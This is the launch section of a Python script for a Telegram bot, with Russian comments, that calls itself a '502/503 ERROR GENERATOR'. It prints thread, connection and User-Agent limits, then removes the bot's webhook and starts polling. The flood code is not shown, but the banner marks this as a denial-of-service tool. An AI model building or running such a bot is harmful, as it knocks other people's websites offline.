# ========== ЗАПУСК ==========
if __name__ == '__main__':
    print("\n" + "="*70)
    print("🔥 FSOCIETY V1000 — 502/503 ERROR GENERATOR 🔥")
    print("="*70)
    print(f"🤖 Бот: @{bot.get_me().username}")
    print(f"⚡ CPU: {hw.cpu_cores} ядер | 🧠 RAM: {hw.ram_gb:.1f} ГБ")
    print(f"🚀 Макс потоков: {hw.max_threads}")
    print(f"🔌 Макс соединений: {hw.max_connections}")
    print(f"🌐 User-Agent: {len(USER_AGENTS)}")
    
    # Удаляем вебхук
    try:
        import requests
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
        print("✅ Вебхук удален")
    except:
        pass
    
    bot.infinity_polling()
